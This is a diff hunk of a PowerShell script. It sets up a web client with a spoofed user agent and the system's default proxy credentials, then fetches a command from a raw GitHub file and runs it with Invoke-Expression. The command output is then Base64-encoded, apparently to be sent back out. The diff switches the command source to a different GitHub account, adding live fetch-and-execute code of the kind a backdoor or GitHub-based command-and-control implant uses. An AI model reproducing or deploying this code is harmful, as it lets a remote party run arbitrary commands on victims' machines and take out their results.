@@ -165,8 +165,9 @@ $wc = New-Object System.Net.WebClient
 $wc.Headers.Add("User-Agent","Mozilla/4.0+")       
 $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
 $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-$cmd = $wc.DownloadString("https://raw.githubusercontent.com/SaurabhAil/codesamples/master/FetchCommand")
-https://api.github.com/repos/SaurabhAil/codesamples/contents/NBK_PC_Output.txt
+#$cmd = $wc.DownloadString("https://raw.githubusercontent.com/SaurabhAil/codesamples/master/FetchCommand")
+$cmd = $wc.DownloadString("https://raw.githubusercontent.com/abhibade9/repos/master/FetchCommand")
+
 $output = Invoke-Expression $cmd
 $Base64Output = [System.Convert]::ToBase64String([char[]]$Output.ToString());
 
